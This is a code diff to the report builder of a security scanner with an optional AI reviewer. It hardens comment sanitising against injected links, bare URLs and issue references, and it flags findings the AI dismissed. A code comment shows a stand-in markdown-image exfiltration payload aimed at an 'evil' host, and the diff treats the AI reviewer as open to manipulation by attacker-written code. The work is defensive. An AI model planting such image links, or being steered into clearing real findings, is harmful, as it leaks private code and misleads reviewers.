@@ -7,6 +7,8 @@ import {
   type FailThreshold,
   type FindingSource,
   isBlocking,
+  isDismissed,
+  isOverruled,
   isRelevant,
   meetsThreshold,
   SCANNER_INFO,
@@ -49,6 +51,8 @@ export interface ReportContext {
   aiSummary: string | null;
   aiRisk: string | null;
   aiError: string | null;
+  /** Why the AI step was deliberately not run, if so. */
+  aiSkipped?: string | null;
   scannerErrors: string[];
 }
 
@@ -69,14 +73,25 @@ const SOURCE_LABEL: Record<FindingSource, string> = {
 
 /**
  * Neutralise text that came from scanners / the agent (both derived from
- * attacker-controllable code) before it's rendered on GitHub: no @mention
- * pings, no forged copies of our hidden marker, no raw HTML.
+ * attacker-controllable code) before it's rendered on GitHub:
+ * - no @mention pings, no forged copies of our hidden marker, no raw HTML;
+ * - no markdown images or links: GitHub fetches image URLs when the comment
+ *   is viewed, so an injected `![](https://evil/?d=<private code>)` would
+ *   leak the repository. Brackets are escaped, so nothing renders as a link;
+ * - no bare URLs or issue references (`#12`, `owner/repo#12`, `GH-12`),
+ *   which GitHub links and turns into cross-references in other repos.
+ * A zero-width space breaks each autolink while the text still reads the same.
  */
 export function sanitize(s: string, max = 2000): string {
   const t = s
     .replace(/<!--|-->/g, "")
     .replace(/<\/?[a-z][^>]*>/gi, "")
-    .replace(/@(?=[A-Za-z0-9-])/g, "@​")
+    .replace(/@(?=[A-Za-z0-9-])/g, "@\u200b")
+    .replace(/[[\]]/g, "\\$&")
+    .replace(/\b(https?):\/\//gi, "$1:\u200b//")
+    .replace(/\bwww\./gi, "www\u200b.")
+    .replace(/#(?=\d)/g, "#\u200b")
+    .replace(/\bGH-(?=\d)/gi, "GH\u200b-")
     .trim();
   return t.length > max ? `${t.slice(0, max - 1)}…` : t;
 }
@@ -93,7 +108,9 @@ export function decideConclusion(
   ctx: Pick<ReportContext, "isPr" | "failOn">,
 ): Conclusion {
   if (ctx.failOn === "never") return "neutral";
-  return findings.some((f) => isBlocking(f, ctx)) ? "fail" : "pass";
+  if (findings.some((f) => isBlocking(f, ctx))) return "fail";
+  // The AI cleared something that would have blocked: don't go green.
+  return findings.some((f) => isOverruled(f, ctx)) ? "neutral" : "pass";
 }
 
 function sortFindings(findings: ReportFinding[]): ReportFinding[] {
@@ -132,10 +149,18 @@ function findingsTable(rows: ReportFinding[], limit: number): string {
   ].join("\n");
 }
 
-function headline(conclusion: Conclusion, rel: ReportFinding[], ctx: ReportContext): string {
+function headline(
+  conclusion: Conclusion,
+  rel: ReportFinding[],
+  overruled: number,
+  ctx: ReportContext,
+): string {
   if (conclusion === "fail") {
     const n = rel.filter((f) => isBlocking(f, ctx)).length;
     return `❌ ${n} blocking issue${n === 1 ? "" : "s"} (severity ≥ ${ctx.failOn})`;
+  }
+  if (overruled > 0) {
+    return `⚠️ ${overruled} finding${overruled === 1 ? "" : "s"} at severity ≥ ${ctx.failOn} dismissed by the AI: check before merging`;
   }
   if (rel.length === 0) return "✅ No security issues found";
   return conclusion === "neutral"
@@ -148,6 +173,7 @@ function aiBlock(ctx: ReportContext): string {
     return `#### 🤖 AI review${ctx.aiRisk ? ` · risk: **${ctx.aiRisk}**` : ""}\n\n${sanitize(ctx.aiSummary, 3000)}`;
   }
   if (ctx.aiError) return `> ⚠️ AI review did not complete: ${sanitize(ctx.aiError, 300)}`;
+  if (ctx.aiSkipped) return `> ℹ️ ${sanitize(ctx.aiSkipped, 400)}`;
   if (!ctx.agent) {
     return "> 💡 Enable the AI reviewer (Claude Code or Codex, with your own subscription) in the repository settings to triage scanner noise and catch logic flaws.";
   }
@@ -156,11 +182,10 @@ function aiBlock(ctx: ReportContext): string {
 
 function stats(findings: ReportFinding[], ctx: ReportContext) {
   const rel = sortFindings(relevant(findings, ctx.isPr));
-  const dismissed = findings.filter((f) => f.aiVerdict === "false_positive").length;
-  const existing = ctx.isPr
-    ? findings.filter((f) => !f.inDiff && f.aiVerdict !== "false_positive").length
-    : 0;
-  return { rel, dismissed, existing, counts: countBySeverity(rel) };
+  const dismissed = findings.filter(isDismissed).length;
+  const existing = ctx.isPr ? findings.filter((f) => !f.inDiff && !isDismissed(f)).length : 0;
+  const overruled = findings.filter((f) => isOverruled(f, ctx)).length;
+  return { rel, dismissed, existing, overruled, counts: countBySeverity(rel) };
 }
 
 /** Body of the sticky PR summary comment. */
@@ -169,9 +194,9 @@ export function buildSummaryComment(
   conclusion: Conclusion,
   ctx: ReportContext,
 ): string {
-  const { rel, dismissed, existing, counts } = stats(findings, ctx);
+  const { rel, dismissed, existing, overruled, counts } = stats(findings, ctx);
   const lines = [
-    `## 🛡️ OpenVScan · ${headline(conclusion, rel, ctx)}`,
+    `## 🛡️ OpenVScan · ${headline(conclusion, rel, overruled, ctx)}`,
     "",
     `Reviewed ${code(ctx.headSha.slice(0, 7))} · ${countsLine(counts)}`,
     "",
@@ -179,6 +204,17 @@ export function buildSummaryComment(
     "",
   ];
   if (rel.length) lines.push(findingsTable(rel, 15), "");
+  if (overruled) {
+    const rows = sortFindings(findings.filter((f) => isOverruled(f, ctx)));
+    lines.push(
+      "#### ⚠️ Dismissed by the AI, would otherwise block",
+      "",
+      "The AI judged these false positives. It reads code from the pull request, so confirm before merging.",
+      "",
+      findingsTable(rows, 10),
+      "",
+    );
+  }
   const notes: string[] = [];
   if (dismissed) notes.push(`🧹 ${dismissed} scanner finding${dismissed === 1 ? "" : "s"} dismissed by the AI as false positives`);
   if (existing) notes.push(`📦 ${existing} pre-existing finding${existing === 1 ? "" : "s"} outside this diff`);
@@ -198,8 +234,8 @@ export function buildCheckOutput(
   conclusion: Conclusion,
   ctx: ReportContext,
 ): { title: string; summary: string; text: string } {
-  const { rel, dismissed, existing, counts } = stats(findings, ctx);
-  const title = headline(conclusion, rel, ctx).replace(/^\S+\s/, "");
+  const { rel, dismissed, existing, overruled, counts } = stats(findings, ctx);
+  const title = headline(conclusion, rel, overruled, ctx).replace(/^\S+\s/, "");
   const summary = [
     countsLine(counts),
     dismissed ? `${dismissed} dismissed as false positives by the AI.` : "",
